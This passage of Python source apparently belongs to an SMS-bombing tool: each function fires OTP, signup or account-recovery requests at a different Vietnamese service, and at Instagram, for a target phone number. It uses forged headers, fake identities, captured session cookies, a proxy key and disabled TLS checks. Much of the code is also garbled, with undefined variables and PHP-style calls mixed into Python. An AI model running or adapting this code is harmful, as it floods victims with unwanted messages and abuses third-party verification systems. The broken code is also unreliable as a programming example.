        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "/",
        "Origin": "https://id.icankid.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://id.icankid.vn/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "gaLM3PQNHV6S=GS1.1.1683042907.1.0.1683042907.60.0.0; gclau=1.1.888294803.1683042909; gaJLL9R732MK=GS1.1.1683042909.1.0.1683042909.0.0.0; gaFMXKZXNRJB=GS1.1.1683042909.1.0.1683042909.60.0.0; hjSessionUser3154488=eyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4cFtim5n0aW5nIjpmYWxzZX0=; hjFirstSeen=1; hjIncludedInSessionSample3154488=0; hjSession3154488=eyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0=; hjAbsoluteSessionInProgress=1; gid=GA1.2.665729834.1683042910; gatgtagUA2014622504=1; gatUA-222516876-1=1; fbp=fb.1.1683042910188.410123624; gaT14T78MGX8=GS1.1.1683042910.1.0.1683042910.0.0.0; ga=GA1.1.820789589.1683042908; ga5KHZV6MD4J=GS1.1.1683042915.1.0.1683042916.0.0.0; ga=GA1.3.820789589.1683042908; gid=GA1.3.665729834.1683042910; gatUA-213798897-3=1"
    }

    data = {
        "phone": sdt,
        "challengecode": "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
        "challengemethod": "SHA256"
    }

    datajson = json.dumps(data)
    
    response = requests.post("https://id.icankid.vn/api/otp/challenge/", headers=headers, data=datajson)                                                       
    
def RIVIU(sdt):
    headers = {
        "Host": "production-account.riviu.co",
        "content-length": "63",
        "appversion": "3.1.6",
        "deviceid": "3723142086",
        "language": "vi",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "regionuuid": "112f7e2e9da240be937daa66b1c4d1ce",
        "accept": "application/json, text/plain, */*",
        "platform": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://riviu.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://riviu.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    datastring = json.dumps(data)
    response = requests.post('https://production-account.riviu.co/v1.0/otp/generate', headers=headers, data=datastring, verify=False)
 
def VOSO(sdt):
    headers = {
        "Host": "voso.vn",
        "content-length": "244",
        "accept": "application/json, text/javascript, /; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://voso.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://voso.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "hjAbsoluteSessionInProgress=0"
    }
    
    data = {
        "name": "Nguyen Van Tuan Anh",
        "email": "botvexzxje2@gmail.com",
        "phone": sdt,
        "step": "1",
        "otp": "",
        "resendotp": "0",
        "otpToken": "",
        "password": "Vrxx#1337",
        "repassword": "Vrxx#1337",
        "csrf": "BXHlLomLJsUPjoAGs61hC-B0xJrzBlzFXUvGPwnC6vJo3lyB4d8URUbnQtvt7uXrflUAq-TjJNIlZxscT2Tw=="
    }
    
    url = "https://voso.vn/auth/signupv2"
    data = urllib.parse.urlencode(data)
    data = data.encode('ascii')
    
    req = urllib.request.Request(url, data, headers)

def THITRUONGSI(sdt):
    headers = {
        "Host": "api.thitruongsi.com",
        "content-length": "641",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {
        "account_phone": sdt
    }
    
    url = "https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone"

def BATDONGSAN(sdt):
  proxy = "http://9abf8e9bd90b41dd23687146da590a43751761ee:js_render=true@proxy.zenrows.com:8001"
  opts = {
    "http": {"proxy": proxy},
    "https": {"proxy": proxy}
  }
  context = ssl._create_default_https_context()
  context.set_proxy(proxy, 'http')
  context.set_proxy(proxy, 'https')
  url = "https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=" + sdt
  response = urllib.request.urlopen(url)

def KIOTVIET(sdt):
    rds = ''.join(random.sample("0123456789abcdef", 7))

    headers = {
        "Host": "www.kiotviet.vn",
        "Content-Length": "287",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "Android",
        "Origin": "https://www.kiotviet.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.kiotviet.vn/dang-ky-webapp/?refcode=746&utm_source=Google&utm_medium=KiotViet-Key&utm_campaign=Google-Search&utm_content=Mien-phi-dung-thu&gclid=Cj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "source_referer=%5B%22refcode%7C746%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%2C%22http-referral%7Cm.kiotviet.vn%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-05-03%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCj0KCQjw6cKiBhD5ARIsAKXUdyZGr2ovb76mSfl9j8WvmE9G_wDG_f41FdoraYaOHIgHzJgOYJ-Y2nEaAicJEALw_wcB%2C%22%5D"
    }

    payload = {
        "phone": "+84" + sdt[1:11],
        "code": rds,
        "name": "Ahad+Kumar",
        "email": "vexnolovr03%40gmail.com",
        "zone": "An+Giang+-+Huy%E1%BB%87n+An+Ph%C3%BA",
        "merchant": rds,
        "username": sdt,
        "industry": "%C4%90i%E1%BB%87n+tho%E1%BA%A1i+%26+%C4%90i%E1%BB%87n+m%C3%A1y",
        "ref_code": "746",
        "industry_id": "65",
        "phone_input": sdt
    }

    response = requests.post("https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php", data=payload, headers=headers)

def BIBABO(sdt):
    Headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    Payload = {
        "phone": sdt,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }
    response = requests.post("https://bibabo.vn/user/verify-phone", headers=Headers, data=Payload)

def SWIFT247(sdt):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, data=json.dumps(postdata))
    
    if "OTPNOCONFIRMED" in response.text:
        url = "https://api.swift247.vn/v1/requestnewotp"
        response = requests.post(url, headers=headers, data=json.dumps(postdata))
        
def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54", 
        "app-version": "1", 
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b", 
        "sec-ch-ua-mobile": "?1", 
        "authorization": "Bearer undefined", 
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", 
        "content-type": "application/json", 
        "accept": "application/json", 
        "i18next-language": "vi", 
        "api-version": "2", 
        "platform": "SELLER_WEB", 
        "sec-ch-ua-platform": "\"Android\"", 
        "origin": "https://seller.kilo.vn", 
        "sec-fetch-site": "same-site", 
        "sec-fetch-mode": "cors", 
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/", 
        "accept-encoding": "gzip, deflate, br", 
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    email = random_string(6) + "@gmail.com"
    data = json.dumps({"phone": sdt, "email": email})
    
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)

def GAPO(sdt):
    Headers = [
        "Host: api.gapo.vn",
        "Content-Length: 31",
        "Content-Type: application/json",
        "Sec-Ch-Ua-Mobile: ?1",
        "Authorization: Bearer",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform: \"Android\"",
        "Accept: */*",
        "Origin: https://www.gapo.vn",
        "Sec-Fetch-Site: same-site",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://www.gapo.vn/",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    ]
    Data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    Options = {
        "http": {
            "header": "\r\n".join(Headers),
            "method": "POST",
            "content": json.dumps(Data),
            "ignore_errors": True
        }
    }
    Context = contextlib._stream_guarded_by_crtp(stream_context, Options)
    Result = urllib.request.urlopen("https://api.gapo.vn/auth/v2.0/signup", context=Context).read()      

def PHUCLONG(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {'phoneNumber': sdt, 'fullName': 'Nguyễn Đặng Hoàng Hải', 'email': 'vexnolove03@gmail.com', 'password': 'Vrxx#1337'}
    datason = json.dumps(data)
    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, data=datason)

def VIETLOTT(sdt):
    headers = {
        "Host": "api-mobi.vietlottsms.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "ClientCallAPI": "EMB",
        "deviceId": "",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "/",
        "partnerChannel": "WEB",
        "Identify-Device-Token": "",
        "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://vietlott-sms.vn",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://vietlott-sms.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }

    data = {'phoneNumber': sdt}
    datason = json.dumps(data)
    response = requests.post('https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber',
                             headers=headers, data=datason)

def GOTADI(sdt):
    headers = {
        "Host": "api.gotadi.com",
        "content-length": "44",
        "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "content-type": "application/json",
        "origin": "https://www.gotadi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.gotadi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }

    postData = {
        "phoneNumber": sdt,
        "language": "VI"
    }

    data = json.dumps(postData)

    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=data, headers=headers)
                                                                                             
def VAMO(sdt):
    headers = [
        "Host: vamo.vn",
        "Content-Length: 24",
        "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vamo.vn",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vamo.vn/app/login",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie: _ga_1HXSGSN1HG=GS1.1.1683203760.3.1.1683203783.0.0.0"
    ]
    data = json.dumps({"username": sdt[1:11]})
    options = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data,
        },
    }
    context = ssl._create_unverified_context()
    response = urlopen("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", context=context)

def OLDFACEBOOK(sdt):
    url = "https://www.instagram.com/accounts/accountrecoverysendajax/"
    data = "emailorusername=" + urlencode(sdt) + "&recaptchachallengefield="
    headers = [
        "Content-Type: application/x-www-form-urlencoded",
        "X-Requested-With: XMLHttpRequest",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 1323 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "x-csrftoken: EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    ]
    opts = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data
        }
    }
    context = ssl.createunverifiedcontext()
    response = urllib.request.urlopen(url, data=data.encode('utf-8'), context=context)

def WINMART(sdt):
    url = "https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=" + urlencode(sdt)
    response = urllib.request.urlopen(url)     

def FUNRING(sdt):
    Headers = {
        "Host": "funring.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Content-Type": "application/json",
        "Origin": "http://funring.vn",
        "Referer": "http://funring.vn/module/register_mobile.jsp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga=GA1.2.1626827841.1679236846; _gid=GA1.2.888694467.1679236846; _gat=1"
    }
    Data = "username=" + sdt
    GET = curl("POST", "https://funring.vn/api/v1.0.1/jersey/user/getotp", Data, Headers, True)

def THANTAIOI(sdt):
        head = [
            "Host: api.thantaioi.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://thantaioi.vn",
            "referer: https://thantaioi.vn/",
        ]
        get = json.decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", None, head, False), true)
 
def VAYSIEUDE(sdt):
    headers = {
        "Host": "vaysieude.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://vaysieude.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer": "https://vaysieude.com/?click_id=643f76517a519600011858c1",
        "cookie": "XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
    }

    # GET request
    response = requests.get("https://vaysieude.com/?click_id=643f76517a519600011858c1", headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    token = soup.find("input", {"name": "_token"}).get("value")

    # POST request
    data = {
        "_token": token,
        "loan[loan_amount]": "20000000",
        "loan[full_name]": "Không biết",
        "loan[identity]": "123456789",
        "loan[phone]": sdt
    }
    response = requests.post("https://vaysieude.com/?click_id=643f76517a519600011858c1", data=data, headers=headers)

def AHAMOVE(sdt):
    headers = {
        "Host": "api.ahamove.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://app.ahamove.com",
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    }
    mail = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6)) + '@gmail.com'
    data = {
        'mobile': sdt,
        'name': 'Tuấn',
        'email': mail,
        'country_code': 'VN',
        'firebase_sms_auth': True
    }
    response = requests.post("https://api.ahamove.com/api/v3/public/user/register", json=data, headers=headers)

def CAYDENTHAN(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.caydenthan.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://caydenthan.vn",
        "referer: https://caydenthan.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", data, head, false), true)
    token = get["token"]
    if token:
        head = [
            "Host: api.caydenthan.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://caydenthan.vn",
            "referer: https://caydenthan.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", None, head, false), true)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", data, head, false), true)

def CAFELAND(sdt):
  head = {
    'Host': 'nhadat.cafeland.vn',
    'accept': 'application/json, text/javascript, /; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://nhadat.cafeland.vn',
    'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
